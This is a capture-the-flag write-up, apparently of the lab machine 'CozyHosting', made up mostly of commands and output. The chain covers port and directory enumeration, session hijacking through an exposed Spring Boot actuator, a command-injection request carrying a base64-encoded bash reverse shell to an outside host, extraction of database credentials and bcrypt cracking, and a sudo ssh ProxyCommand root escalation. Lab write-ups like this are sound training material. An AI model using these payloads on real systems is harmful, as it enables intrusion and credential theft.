# Nmap
```bash
Nmap scan report for 10.10.11.230
Host is up, received user-set (0.016s latency).
Scanned at 2024-02-16 10:34:02 +08 for 169s
Not shown: 65442 closed tcp ports (reset), 89 filtered tcp ports (no-response)
PORT     STATE SERVICE     REASON         VERSION
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEpNwlByWMKMm7ZgDWRW+WZ9uHc/0Ehct692T5VBBGaWhA71L+yFgM/SqhtUoy0bO8otHbpy3bPBFtmjqQPsbC8=
|   256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHVzF8iMVIHgp9xMX9qxvbaoXVg1xkGLo61jXuUAYq5q
80/tcp   open  http        syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://cozyhosting.htb
8088/tcp open  radan-http? syn-ack ttl 63
9000/tcp open  cslistener? syn-ack ttl 63
```

# User Flag
## Dirbuster
```bash
gobuster dir -u http://cozyhosting.htb -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cozyhosting.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/]                    (Status: 400) [Size: 435]
/[                    (Status: 400) [Size: 435]
/actuator             (Status: 200) [Size: 634]
/admin                (Status: 401) [Size: 97]
/asdfjkl;             (Status: 200) [Size: 0]
/error                (Status: 500) [Size: 73]
/index                (Status: 200) [Size: 12706]
/login                (Status: 200) [Size: 4431]
/logout               (Status: 204) [Size: 0]
/plain]               (Status: 400) [Size: 435]
/quote]               (Status: 400) [Size: 435]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```

## Actuator Session Cookie
```
http://cozyhosting.htb/actuator/sessions

HTTP/1.1 200 
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 16 Feb 2024 02:59:42 GMT
Content-Type: application/vnd.spring-boot.actuator.v3+json
Connection: close
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Content-Length: 245

{"DC58F8713C0EDB7738C3E60FAEF873F5":"UNAUTHORIZED",
"D6781DF538AABD16F93CF2DD57F6E59F":"UNAUTHORIZED",
"3E74E5011EBFD72E7B558414B403E17A":"UNAUTHORIZED",
"95B7B10A46E32BCA81C60E987A3D0D07":"kanderson",
"911EA3DAE63379C5D158AA85E8450259":"kanderson"}
```

## Command Injection
```
POST /executessh HTTP/1.1
Host: cozyhosting.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 81
Origin: http://cozyhosting.htb
Connection: close
Referer: http://cozyhosting.htb/admin
Cookie: JSESSIONID=911EA3DAE63379C5D158AA85E8450259
Upgrade-Insecure-Requests: 1

host=127.0.0.1&username=a%3b`echo${IFS}YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC43LzEyMzQgMD4mMQ%3d%3d|base64${IFS}-d|bash`
```

## Postgres
Transfer cloudhosting-0.0.1.jar to local and read content with jadx.
![Postgresql](https://github.com/ngohuiann/CTF-Write-Ups/blob/main/image/CosyHosting1.png)

```bash
app@cozyhosting:/app$ psql -U postgres -h localhost
psql -U postgres -h localhost
Password for user postgres: Vg&nvzAQ7XxR

\l
                                   List of databases
    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
-------------+----------+----------+-------------+-------------+-----------------------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
 template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
(4 rows)

\c cozyhosting
You are now connected to database "cozyhosting" as user "postgres".

\dt
 public | hosts | table | postgres
 public | users | table | postgres

select * from hosts;
  1 | kanderson | suspicious mcnulty
  5 | kanderson | boring mahavira
  6 | kanderson | stoic varahamihira
  7 | kanderson | awesome lalande

select * from users;
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin

hashcat -m 3200 hash.txt rockyou.txt
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
```

# User Flag
```
app@cozyhosting:/app$ su josh
su josh
Password: 
id
uid=1003(josh) gid=1003(josh) groups=1003(josh)
ls -la /home/josh
total 36
drwxr-x--- 3 josh josh 4096 Aug  8  2023 .
drwxr-xr-x 3 root root 4096 May 18  2023 ..
lrwxrwxrwx 1 root root    9 May 11  2023 .bash_history -> /dev/null
-rw-r--r-- 1 josh josh  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 josh josh 3771 Jan  6  2022 .bashrc
drwx------ 2 josh josh 4096 May 18  2023 .cache
-rw------- 1 josh josh   20 May 18  2023 .lesshst
-rw-r--r-- 1 josh josh  807 Jan  6  2022 .profile
lrwxrwxrwx 1 root root    9 May 21  2023 .psql_history -> /dev/null
-rw-r----- 1 root josh   33 Feb 16 03:35 user.txt
-rw-r--r-- 1 josh josh   39 Aug  8  2023 .vimrc
```

# Root Flag
```bash
josh@cozyhosting:/app$ sudo -l
sudo -l
[sudo] password for josh: manchesterunited

Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
josh@cozyhosting:/app$ sudo /usr/bin/ssh -o ProxyCommand=';sh 0<&2 1>&2' x
sudo /usr/bin/ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# id
id
uid=0(root) gid=0(root) groups=0(root)
```
ref: https://gtfobins.github.io/gtfobins/ssh/#sudo
